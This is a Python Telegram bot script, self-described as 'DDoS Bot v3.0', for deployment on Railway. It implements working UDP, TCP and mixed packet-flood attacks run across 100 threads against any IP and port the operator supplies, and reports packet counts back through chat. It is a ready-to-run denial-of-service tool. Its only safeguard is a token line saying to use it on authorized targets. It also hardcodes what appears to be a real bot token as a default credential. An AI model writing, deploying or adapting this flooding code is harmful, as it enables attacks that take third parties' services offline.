# bot.py - Railway Deploy Ready (Based on your original code)
import socket
import threading
import time
import random
import re
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters

# ============ CONFIGURATION (Railway ENV) ============
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8278228198:AAG7C97c7R50_gsykoqBMwesCuoRZTciCLA")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 8210011971))

BLOCKED_PORTS = {22, 25, 443, 3389, 8700, 9031, 17500, 20000, 20001, 20002}
attack_running = False
attack_stats = {'packets': 0}
attack_lock = threading.Lock()
user_data = {}

# ============ ATTACK METHODS (from your original code) ============
def udp_flood(ip, port, duration, update_callback):
    global attack_running, attack_stats
    timeout = time.time() + int(duration)
    port = int(port)
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(1024)
        
        while time.time() < timeout and attack_running:
            try:
                sock.sendto(payload, (ip, port))
                with attack_lock:
                    attack_stats['packets'] += 1
                time.sleep(0.001)
            except:
                pass
        sock.close()
    except:
        pass

def tcp_flood(ip, port, duration, update_callback):
    global attack_running, attack_stats
    timeout = time.time() + int(duration)
    
    while time.time() < timeout and attack_running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect_ex((ip, int(port)))
            sock.send(b'GET / HTTP/1.1\r\n\r\n')
            sock.close()
            with attack_lock:
                attack_stats['packets'] += 1
            time.sleep(0.005)
        except:
            pass

def mixed_attack(ip, port, duration, update_callback):
    global attack_running, attack_stats
    timeout = time.time() + int(duration)
    
    while time.time() < timeout and attack_running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(random._urandom(512), (ip, int(port)))
            sock.close()
            with attack_lock:
                attack_stats['packets'] += 1
            time.sleep(0.002)
        except:
            pass

def launch_attack(ip, port, duration, method, update_func):
    global attack_running, attack_stats
    
    attack_running = True
    attack_stats = {'packets': 0}
    start_time = time.time()
    
    if method == 'udp':
        target = udp_flood
    elif method == 'tcp':
        target = tcp_flood
    else:
        target = mixed_attack
    
    threads = []
    num_threads = 100  # As per your original code
    
    for i in range(num_threads):
        t = threading.Thread(target=target, args=(ip, port, duration, update_func), daemon=True)
        t.start()
        threads.append(t)
    
    dur = int(duration)
    last_update = 0
    
    while attack_running and (time.time() - start_time) < dur:
        time.sleep(2)
        remaining = dur - int(time.time() - start_time)
        
        if time.time() - last_update > 5:
            last_update = time.time()
            try:
                update_func(f"⚡ ATTACK RUNNING\n"
                           f"Target: {ip}:{port}\n"
                           f"Packets: {attack_stats['packets']:,}\n"
                           f"Remaining: {remaining}s\n"
                           f"Method: {method.upper()}")
            except:
                pass
    
    attack_running = False
    
    try:
        update_func(f"✅ ATTACK COMPLETE\n"
                   f"Target: {ip}:{port}\n"
                   f"Total Packets: {attack_stats['packets']:,}\n"
                   f"Duration: {dur}s")
    except:
        pass

# ============ BOT HANDLERS ============
def start(update, context):
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        update.message.reply_text("❌ Unauthorized Access")
        return
    
    user_data[user_id] = {'step': 'ip'}
    update.message.reply_text(
        "🔥 DDoS Bot v3.0 (Railway) 🔥\n\n"
        "Send target IP address:\n"
        "Example: 192.168.1.1"
    )

def handle_message(update, context):
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        return
    
    text = update.message.text.strip()
    user_step = user_data.get(user_id, {})
    step = user_step.get('step')
    
    if step == 'ip':
        ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
        if not ip_pattern.match(text):
            update.message.reply_text("❌ Invalid IP. Send again:")
            return
        
        user_data[user_id]['ip'] = text
        user_data[user_id]['step'] = 'port'
        update.message.reply_text(
            f"🔌 Send port number:\nExample: 80\n\n"
            f"🚫 Blocked ports: {', '.join(map(str, sorted(BLOCKED_PORTS)))}"
        )
    
    elif step == 'port':
        try:
            port = int(text)
            if port < 1 or port > 65535:
                update.message.reply_text("❌ Port must be 1-65535")
                return
            if port in BLOCKED_PORTS:
                update.message.reply_text(f"❌ Port {port} is blocked! Use different port.")
                return
            
            user_data[user_id]['port'] = port
            user_data[user_id]['step'] = 'method'
            
            keyboard = [
                [InlineKeyboardButton("UDP Flood", callback_data="udp")],
                [InlineKeyboardButton("TCP Flood", callback_data="tcp")],
                [InlineKeyboardButton("Mixed Attack", callback_data="mixed")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            update.message.reply_text("Select attack method:", reply_markup=reply_markup)
            
        except ValueError:
            update.message.reply_text("❌ Send valid port number:")
    
    elif step == 'duration':
        try:
            duration = int(text)
            if duration < 10 or duration > 300:
                update.message.reply_text("❌ Duration must be 10-300 seconds")
                return
            
            ip = user_data[user_id]['ip']
            port = user_data[user_id]['port']
            method = user_data[user_id].get('method', 'mixed')
            
            update.message.reply_text(
                f"🔥 ATTACK STARTED 🔥\n\n"
                f"Target: {ip}:{port}\n"
                f"Method: {method.upper()}\n"
                f"Duration: {duration}s\n\n"
                f"Sending packets..."
            )
            
            def send_update(msg):
                try:
                    update.message.reply_text(msg)
                except:
                    pass
            
            attack_thread = threading.Thread(
                target=launch_attack,
                args=(ip, port, duration, method, send_update),
                daemon=True
            )
            attack_thread.start()
            
            del user_data[user_id]
            
        except ValueError:
            update.message.reply_text("❌ Send valid duration (seconds):")

def button_callback(update, context):
    query = update.callback_query
    query.answer()
    
    user_id = query.from_user.id
    if user_id != ADMIN_ID:
        query.edit_message_text("❌ Unauthorized")
        return
    
    method = query.data
    if method in ['udp', 'tcp', 'mixed']:
        user_data[user_id]['method'] = method
        user_data[user_id]['step'] = 'duration'
        query.edit_message_text(
            f"✅ Method selected: {method.upper()}\n\n"
            f"Send duration in seconds (10-300):"
        )

def stop(update, context):
    global attack_running
    if update.effective_user.id != ADMIN_ID:
        update.message.reply_text("❌ Unauthorized")
        return
    
    attack_running = False
    update.message.reply_text("🛑 Attack stopped by user")

def help_command(update, context):
    if update.effective_user.id != ADMIN_ID:
        update.message.reply_text("❌ Unauthorized")
        return
    
    update.message.reply_text(
        "🤖 DDoS Bot Commands\n\n"
        "/start - Start attack setup\n"
        "/stop - Stop running attack\n"
        "/help - Show this help\n\n"
        "Attack Process:\n"
        "1. IP address\n"
        "2. Port number\n"
        "3. Method (UDP/TCP/Mixed)\n"
        "4. Duration (10-300s)\n\n"
        f"Blocked Ports: {', '.join(map(str, sorted(BLOCKED_PORTS)))}\n\n"
        "⚠️ Use only on authorized targets!"
    )

def main():
    print("=" * 50)
    print("🔥 Starting DDoS Bot on Railway...")
    print(f"👑 Admin ID: {ADMIN_ID}")
    print(f"🚫 Blocked ports: {sorted(BLOCKED_PORTS)}")
    print("=" * 50)
    
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher
    
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("stop", stop))
    dp.add_handler(CommandHandler("help", help_command))
    dp.add_handler(CallbackQueryHandler(button_callback))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
    
    print("✅ Bot is running! Send /start on Telegram")
    print("=" * 50)
    
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
